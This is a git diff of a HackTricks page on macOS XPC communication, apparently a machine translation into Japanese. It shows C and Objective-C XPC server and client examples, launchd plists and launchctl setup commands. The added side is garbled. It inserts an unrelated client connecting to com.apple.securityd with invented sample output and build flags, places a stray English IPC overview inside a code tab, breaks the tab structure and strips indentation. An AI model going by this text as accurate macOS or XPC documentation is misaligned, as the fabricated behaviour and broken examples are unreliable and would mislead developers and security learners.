 [macos-xpc-authorization.md](macos-xpc-authorization.md)
 {% endcontent-ref %}
 
-### C Code Example
+### Cコードの例
 
 {% tabs %}
 {% tab title="xpc_server.c" %}
@@ -801,87 +888,146 @@ Apple also allows apps to **configure some rights and how to get them** so if th
 #include <xpc/xpc.h>
 
 static void handle_event(xpc_object_t event) {
-    if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
-        // Print received message
-        const char* received_message = xpc_dictionary_get_string(event, "message");
-        printf("Received message: %s\n", received_message);
+if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
+// Print received message
+const char* received_message = xpc_dictionary_get_string(event, "message");
+printf("Received message: %s\n", received_message);
 
-        // Create a response dictionary
-        xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
-        xpc_dictionary_set_string(response, "received", "received");
+// Create a response dictionary
+xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
+xpc_dictionary_set_string(response, "received", "received");
 
-        // Send response
-        xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
-        xpc_connection_send_message(remote, response);
+// Send response
+xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
+xpc_connection_send_message(remote, response);
 
-        // Clean up
-        xpc_release(response);
-    }
+// Clean up
+xpc_release(response);
+}
 }
 
 static void handle_connection(xpc_connection_t connection) {
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        handle_event(event);
-    });
-    xpc_connection_resume(connection);
+xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
+handle_event(event);
+});
+xpc_connection_resume(connection);
 }
 
 int main(int argc, const char *argv[]) {
-    xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
-                                                                   dispatch_get_main_queue(),
-                                                                   XPC_CONNECTION_MACH_SERVICE_LISTENER);
-    if (!service) {
-        fprintf(stderr, "Failed to create service.\n");
-        exit(EXIT_FAILURE);
-    }
+xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
+dispatch_get_main_queue(),
+XPC_CONNECTION_MACH_SERVICE_LISTENER);
+if (!service) {
+fprintf(stderr, "Failed to create service.\n");
+exit(EXIT_FAILURE);
+}
 
-    xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
+xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
+xpc_type_t type = xpc_get_type(event);
+if (type == XPC_TYPE_CONNECTION) {
+handle_connection(event);
+}
+});
+
+xpc_connection_resume(service);
+dispatch_main();
+
+return 0;
+}
+```
+{% tab title="xpc_client.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <xpc/xpc.h>
+
+int main(int argc, const char * argv[]) {
+    xpc_connection_t connection = xpc_connection_create_mach_service("com.apple.securityd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+    
+    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
         xpc_type_t type = xpc_get_type(event);
-        if (type == XPC_TYPE_CONNECTION) {
-            handle_connection(event);
+        
+        if (type == XPC_TYPE_DICTIONARY) {
+            const char *description = xpc_dictionary_get_string(event, "description");
+            printf("Received event: %s\n", description);
         }
     });
-
-    xpc_connection_resume(service);
+    
+    xpc_connection_resume(connection);
+    
     dispatch_main();
-
+    
     return 0;
 }
 ```
-{% endtab %}
 
-{% tab title="xpc_client.c" %}
+このコードは、`com.apple.securityd`という名前のMachサービスに接続するXPCクライアントを作成します。XPC接続は、プロセス間通信（IPC）メカニズムであり、macOSにおいてセキュリティイベントを受信するために使用されます。
+
+`xpc_connection_create_mach_service`関数は、指定されたMachサービスに接続するためのXPC接続オブジェクトを作成します。第1引数にはMachサービスの名前、第2引数には接続の識別子（NULLの場合は新しい識別子が生成されます）、第3引数には接続の種類を指定します。`XPC_CONNECTION_MACH_SERVICE_PRIVILEGED`は、特権付きのMachサービスに接続するためのフラグです。
+
+`xpc_connection_set_event_handler`関数は、指定されたXPC接続に対してイベントハンドラを設定します。イベントハンドラは、接続に関連するイベントが発生した際に呼び出されます。この例では、イベントがディクショナリ型である場合に、"description"キーに関連する文字列を取得し、それを出力します。
+
+`xpc_connection_resume`関数は、指定されたXPC接続を開始します。
+
+`dispatch_main`関数は、メインスレッドの実行ループを開始します。これにより、プログラムが終了するまでイベントの受信と処理が継続されます。
+
+このコードをコンパイルして実行すると、`com.apple.securityd`から送信されるイベントの説明が表示されます。
+
+```bash
+$ gcc -o xpc_client xpc_client.c -lxpc
+$ ./xpc_client
+Received event: Security event occurred
+Received event: Another security event occurred
+...
+```
+
+{% endtab %}
 ```c
 // gcc xpc_client.c -o xpc_client
 
 #include <xpc/xpc.h>
 
 int main(int argc, const char *argv[]) {
-    xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
 
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
-            // Print received message
-            const char* received_message = xpc_dictionary_get_string(event, "received");
-            printf("Received message: %s\n", received_message);
-        }
-    });
+xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
+if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
+// Print received message
+const char* received_message = xpc_dictionary_get_string(event, "received");
+printf("Received message: %s\n", received_message);
+}
+});
 
-    xpc_connection_resume(connection);
+xpc_connection_resume(connection);
 
-    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
-    xpc_dictionary_set_string(message, "message", "Hello, Server!");
+xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+xpc_dictionary_set_string(message, "message", "Hello, Server!");
 
-    xpc_connection_send_message(connection, message);
+xpc_connection_send_message(connection, message);
 
-    dispatch_main();
-    
-    return 0;
+dispatch_main();
+
+return 0;
 }
 ```
-{% endtab %}
+{% tab title="xyz.hacktricks.service.plist" %}xyz.hacktricks.service.plistファイルは、macOSで実行されるサービスの設定ファイルです。このファイルは、サービスの起動時に使用されるパラメータや環境変数などの設定を含んでいます。このファイルを編集することで、サービスの動作をカスタマイズすることができます。
 
-{% tab title="xyz.hacktricks.service.plist" %}
+このファイルは、XML形式で記述されており、以下のような要素を含んでいます。
+
+- Label: サービスの識別子として使用される文字列です。
+- ProgramArguments: サービスの実行時に実行されるコマンドや引数のリストです。
+- EnvironmentVariables: サービスの実行時に設定される環境変数のリストです。
+- RunAtLoad: サービスの起動時に自動的に実行されるかどうかを指定します。
+- KeepAlive: サービスが異常終了した場合に自動的に再起動するかどうかを指定します。
+
+このファイルを編集する際には、注意が必要です。間違った設定を行うと、サービスの動作に影響を与える可能性があります。また、このファイルの変更は、管理者権限が必要な場合があります。
+
+サービスの設定を変更する際には、事前にバックアップを作成することをおすすめします。また、変更後にサービスを再起動する必要がある場合があります。
+
+このファイルの場所は、`/Library/LaunchDaemons`または`/Library/LaunchAgents`ディレクトリです。それぞれ、システム全体のサービスとユーザー固有のサービスの設定を含んでいます。
+
+このファイルを編集することで、サービスの動作をカスタマイズすることができますが、慎重に行う必要があります。適切な設定を行わないと、セキュリティ上のリスクや予期しない動作が発生する可能性があります。
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -889,22 +1035,21 @@ int main(int argc, const char *argv[]) {
 <key>Label</key>
 <string>xyz.hacktricks.service</string>
 <key>MachServices</key>
-    <dict>
-        <key>xyz.hacktricks.service</key>
-        <true/>
-    </dict>
+<dict>
+<key>xyz.hacktricks.service</key>
+<true/>
+</dict>
 <key>Program</key>
-    <string>/tmp/xpc_server</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/tmp/xpc_server</string>
-    </array>
+<string>/tmp/xpc_server</string>
+<key>ProgramArguments</key>
+<array>
+<string>/tmp/xpc_server</string>
+</array>
 </dict>
 </plist>
 ```
 {% endtab %}
 {% endtabs %}
-
 ```bash
 # Compile the server & client
 gcc xpc_server.c -o xpc_server
@@ -924,8 +1069,7 @@ sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist
 sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
 sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
 ```
-
-### ObjectiveC Code Example
+### ObjectiveCコードの例
 
 {% tabs %}
 {% tab title="oc_xpc_server.m" %}
@@ -943,9 +1087,9 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
 
 @implementation MyXPCObject
 - (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
-    NSLog(@"Received message: %@", some_string);
-    NSString *response = @"Received";
-    reply(response);
+NSLog(@"Received message: %@", some_string);
+NSString *response = @"Received";
+reply(response);
 }
 @end
 
@@ -956,30 +1100,28 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
 @implementation MyDelegate
 
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
-    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
+newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
 
-    MyXPCObject *my_object = [MyXPCObject new];
+MyXPCObject *my_object = [MyXPCObject new];
 
-    newConnection.exportedObject = my_object;
+newConnection.exportedObject = my_object;
 
-    [newConnection resume];
-    return YES;
+[newConnection resume];
+return YES;
 }
 @end
 
 int main(void) {
 
-    NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];
+NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];
 
-    id <NSXPCListenerDelegate> delegate = [MyDelegate new];
-    listener.delegate = delegate;
-    [listener resume];
+id <NSXPCListenerDelegate> delegate = [MyDelegate new];
+listener.delegate = delegate;
+[listener resume];
 
-    sleep(10); // Fake something is done and then it ends
+sleep(10); // Fake something is done and then it ends
 }
 ```
-{% endtab %}
-
 {% tab title="oc_xpc_client.m" %}
 ```objectivec
 // gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
@@ -990,22 +1132,42 @@ int main(void) {
 @end
 
 int main(void) {
-    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
-    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
-    [connection resume];
+NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
+connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
+[connection resume];
 
-    [[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
-        NSLog(@"Received response: %@", response);
-    }];
+[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
+NSLog(@"Received response: %@", response);
+}];
 
-    [[NSRunLoop currentRunLoop] run];
+[[NSRunLoop currentRunLoop] run];
 
-    return 0;
+return 0;
 }
 ```
+# macOS IPC (Inter-Process Communication)
+
+Inter-Process Communication (IPC) is a mechanism that allows different processes to communicate with each other and share data. In macOS, there are several IPC mechanisms available, including:
+
+- **Mach Ports**: Mach ports are the fundamental IPC mechanism in macOS. They allow processes to send messages and share resources.
+- **UNIX Domain Sockets**: UNIX domain sockets provide a communication channel between processes on the same machine.
+- **Distributed Objects**: Distributed objects allow objects to be shared between processes using the Objective-C runtime.
+- **XPC**: XPC (eXtensible Procedure Call) is a lightweight IPC mechanism introduced in macOS 10.7. It allows processes to communicate with each other and perform remote procedure calls.
+
+Understanding how IPC works in macOS is important for both security and privilege escalation. By exploiting vulnerabilities in IPC mechanisms, an attacker can gain unauthorized access to sensitive data or escalate their privileges.
+
+In this section, we will explore different IPC mechanisms in macOS and discuss potential security vulnerabilities and privilege escalation techniques associated with them.
+
+## Table of Contents
+
+- [Mach Ports](mach-ports.md)
+- [UNIX Domain Sockets](unix-domain-sockets.md)
+- [Distributed Objects](distributed-objects.md)
+- [XPC](xpc.md)
+
 {% endtab %}
 
-{% tab title="Untitled" %}
+{% tab title="Untitled (翻訳)" %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -1013,22 +1175,21 @@ int main(void) {
 <key>Label</key>
 <string>xyz.hacktricks.svcoc</string>
 <key>MachServices</key>
-    <dict>
-        <key>xyz.hacktricks.svcoc</key>
-        <true/>
-    </dict>
+<dict>
+<key>xyz.hacktricks.svcoc</key>
+<true/>
+</dict>
 <key>Program</key>
-    <string>/tmp/oc_xpc_server</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/tmp/oc_xpc_server</string>
-    </array>
+<string>/tmp/oc_xpc_server</string>
+<key>ProgramArguments</key>
+<array>
+<string>/tmp/oc_xpc_server</string>
+</array>
 </dict>
 </plist>
 ```
 {% endtab %}
 {% endtabs %}
-
 ```bash
 # Compile the server & client
 gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
@@ -1048,8 +1209,7 @@ sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
 sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
 sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
 ```
-
-## References
+## 参考文献
 
 * [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
 * [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
@@ -1059,10 +1219,10 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
